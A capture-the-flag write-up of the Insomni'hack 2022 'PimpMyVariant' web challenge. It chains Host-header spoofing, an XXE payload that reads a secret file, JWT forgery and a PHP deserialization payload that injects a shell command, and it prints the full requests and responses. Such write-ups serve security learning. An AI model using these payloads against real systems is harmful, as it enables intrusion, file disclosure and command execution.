---
title: Insomni'hack teaser 2022 – PimpMyVariant
date: '2022-01-30'
draft: false
authors: ['blueset']
tags: ["Insomni'hack teaser 2022", 'Web', 'PHP', 'Serialize', 'XML', 'XXE', 'JWT']
summary: 'Host header, XXE, JWT, and serialization.'
---
## PimpMyVariant
> by stygis
>
> Seen as it went, why not guess the next variant name : [pimpmyvariant.insomnihack.ch](https://pimpmyvariant.insomnihack.ch)

```html
GET / HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Host: pimpmyvariant.insomnihack.ch


HTTP/1.1 200 OK
Cache-Control: no-transform
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
Date: Sun, 30 Jan 2022 02:43:36 GMT
Feature-Policy: geolocation none;midi none;notifications none;push none;sync-xhr none;microphone none;camera none;magnetometer none;gyroscope none;speaker self;vibrate none;fullscreen self;payment none;
Server: nginx
Transfer-Encoding: chunked
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block

<html><head>
	<link rel="stylesheet" href="./dark-theme.css">
	<title>PimpMyVariant</title>
</head><body>
	<h1>Variants list</h1>

<ul><li>Alpha</li><li>Beta</li><li>Gamma</li><li>Delta</li><li>Omicron</li><li>Lambda</li><li>Epsilon</li><li>Zeta</li><li>Eta</li><li>Theta</li><li>Iota</li></ul>
</body></html>
```

Through trial and error, `robots.txt` is found in the root directory, with the following content:

```
/readme
/new
/log
/flag.txt
/todo.txt
```

`todo.txt` has:

```
test back
```

`flag.txt` returns HTTP 403 with:

```
Try harder
```

`log` has:

```html
<html><head>
	<link rel="stylesheet" href="./dark-theme.css">
	<title>PimpMyVariant</title>
</head><body>
	<h1>Logs</h1>

Access restricted to admin only
```

`readme` has:

```html
<html><head>
	<link rel="stylesheet" href="./dark-theme.css">
	<title>PimpMyVariant</title>
</head><body>
	<h1>Readme</h1>

Hostname not allowed
```

Request `readme` with `Host: 127.0.0.1` returns:

```html
<html><head>
	<link rel="stylesheet" href="./dark-theme.css">
	<title>PimpMyVariant</title>
</head><body>
	<h1>Readme</h1>

#DEBUG- JWT secret key can now be found in the /www/jwt.secret.txt file
```


`new` has:

```html
<html><head>
	<link rel="stylesheet" href="./dark-theme.css">
	<title>PimpMyVariant</title>
</head><body>
	<h1>New variant</h1>

Hostname not autorized
```

Request `new` with `Host: 127.0.0.1` returns:

```html
<html><head>
	<link rel="stylesheet" href="./dark-theme.css">
	<title>PimpMyVariant</title>
</head><body>
	<h1>New variant</h1>


<form method="post" enctype="application/x-www-form-urlencoded" id="variant_form">
	Guess the next variant name : <input type="text" name="variant_name" id="variant_name" placeholder="inso-micron ?" /><br />
	<input type="submit" name="Bet on this" />
</form>
<script type="text/javascript">
document.getElementById('variant_form').onsubmit = function(){
	var variant_name=document.getElementById('variant_name').value;
	postData('/api', "<?xml version='1.0' encoding='utf-8'?><root><name>"+variant_name+"</name></root>")
		.then(data => {
			window.location.href='/';
		});
	return false;
}

async function postData(url = '', data = {}) {
	return await fetch(url, {
		method: 'POST',
		cache: 'no-cache',
		headers: {
			'Content-Type': 'text/xml'
		},
		redirect: 'manual',
		referrerPolicy: 'no-referrer',
		body: data
	});
}
</script>

</body></html>
```

From this page, we can get a new endpoint that accepts XML. With the hint where there is a JWT secret at `/www/jwt.secret.txt`, we can craft an XML External Entity to read the file.

```
POST /api HTTP/1.1
Content-Type: text/xml
Host: 127.0.0.1
Connection: close
Content-Length: 139

<?xml version='1.0' encoding='utf-8'?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///www/jwt.secret.txt"> ]>
<root><name>&xxe;</name></root>


HTTP/1.1 302 Found
Server: nginx
Date: Sun, 30 Jan 2022 02:50:42 GMT
Content-Type: text/xml;charset=UTF-8
Transfer-Encoding: chunked
Connection: close
Set-Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ2YXJpYW50cyI6WyJBbHBoYSIsIkJldGEiLCJHYW1tYSIsIkRlbHRhIiwiT21pY3JvbiIsIkxhbWJkYSIsIkVwc2lsb24iLCJaZXRhIiwiRXRhIiwiVGhldGEiLCJJb3RhIiwiNTRiMTYzNzgzYzQ2ODgxZjFmZTdlZTA1ZjkwMzM0YWEiXSwic2V0dGluZ3MiOiJhOjE6e2k6MDtPOjQ6XCJVc2VyXCI6Mzp7czo0OlwibmFtZVwiO3M6NDpcIkFub25cIjtzOjc6XCJpc0FkbWluXCI7YjowO3M6MjpcImlkXCI7czo0MDpcIjZjZDQ1YmJkY2M3ZjcwZWVkNjA4OGE3NDUxMTA1MWQxNWZkNmFhNDBcIjt9fSIsImV4cCI6MTY0MzUxMTEwMn0.cpoH8E1zR4HEP3cDfEWH8ceHA1bygf_6iXzzv0OicNA
Location: /
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-transform
Feature-Policy: geolocation none;midi none;notifications none;push none;sync-xhr none;microphone none;camera none;magnetometer none;gyroscope none;speaker self;vibrate none;fullscreen self;payment none;

<?xml version="1.0" encoding="utf-8"?>
<root><sucess>Variant name added !</sucess></root>

```

In the cookie, we can find a JWT token which has the following payload:

```json
{
  "variants": [
    "Alpha",
    "Beta",
    "Gamma",
    "Delta",
    "Omicron",
    "Lambda",
    "Epsilon",
    "Zeta",
    "Eta",
    "Theta",
    "Iota",
    "54b163783c46881f1fe7ee05f90334aa"
  ],
  "settings": "a:1:{i:0;O:4:\"User\":3:{s:4:\"name\";s:4:\"Anon\";s:7:\"isAdmin\";b:0;s:2:\"id\";s:40:\"6cd45bbdcc7f70eed6088a74511051d15fd6aa40\";}}",
  "exp": 1643511102
}
```

With `54b163783c46881f1fe7ee05f90334aa` being the JWT token extracted from the XXE.

However, when trying to include the flag (with `/web/flag.txt`), we get this instead:

```xml
<?xml version="1.0" encoding="utf-8"?>
<root><error>Invalid variant name ! Allowed only ^[A-Za-z0-9 -_]{1,33}$</error></root>
```

In the `"settings"` property in the payload, we can see a PHP serialized object of `User` class with `isAdmin` set to false.

Updating the properties `name` to `admin` and `isAdmin` to true, we reconstruct a JWT token, and request `/log` with it. We got the following response from `/log`:

```html
<html><head>
	<link rel="stylesheet" href="./dark-theme.css">
	<title>PimpMyVariant</title>
</head><body>
	<h1>Logs</h1>

<textarea style="width:100%; height:100%; border:0px;" disabled="disabled">
[2021-12-25 02:12:01] Fatal error: Uncaught Error: Bad system command call from UpdateLogViewer::read() from global scope in /www/log.php:36
Stack trace:
#0 {main}
  thrown in /www/log.php on line 37
#0 {UpdateLogViewer::read}
  thrown in /www/UpdateLogViewer.inc on line 26

</textarea>
</body></html>
```

Accessing https://pimpmyvariant.insomnihack.ch/UpdateLogViewer.inc, we can see a PHP source file:

```php
<?php

class UpdateLogViewer
{
	public string $packgeName;
	public string $logCmdReader;
	private static ?UpdateLogViewer $singleton = null;

	private function __construct(string $packgeName)
	{
		$this->packgeName = $packgeName;
		$this->logCmdReader = 'cat';
	}

	public static function instance() : UpdateLogViewer
	{
		if( !isset(self::$singleton) || self::$singleton === null ){
			$c = __CLASS__;
			self::$singleton = new $c("$c");
		}
		return self::$singleton;
	}

	public static function read():string
	{
		return system(self::logFile());
	}

	public static function logFile():string
	{
		return self::instance()->logCmdReader.' /var/log/UpdateLogViewer_'.self::instance()->packgeName.'.log';
	}

    public function __wakeup()// serialize
    {
    	self::$singleton = $this;
    }
};
```

From the source, we can see 2 points that can give us a remote shell:

1. `__wakeup()`, which is called when the object is unserialized, sets the unserialize object as the singleton.
2. `system()` is used to print the log with `logCmdReader` modifiable from the serialization.

Making use of this feature, we can craft a PHP serialization string that sets a property of the `User` object to a `UpdateLogViewer` object with `logCmdReader` set to `cat flag.txt && echo` to execute the command.

```json
"a:1:{i:0;O:4:\"User\":4:{s:4:\"name\";s:5:\"admin\";s:7:\"isAdmin\";b:1;s:2:\"id\";s:40:\"6cd45bbdcc7f70eed6088a74511051d15fd6aa40\";s:3:\"ulv\";O:15:\"UpdateLogViewer\":2:{s:10:\"packgeName\";s:15:\"UpdateLogViewer\";s:12:\"logCmdReader\";s:20:\"cat flag.txt && echo\";}}}"
```

Alternatively, we can keep `logCmdReader` as `cat` and set `packgeName` to `/../../../web/flag.txt` to achieve the same effect.

Fit the crafted PHP serialization string in the `"settings"` property of the payload, generate a new JWT, and request `/log` with it. We can then get the flag from the response.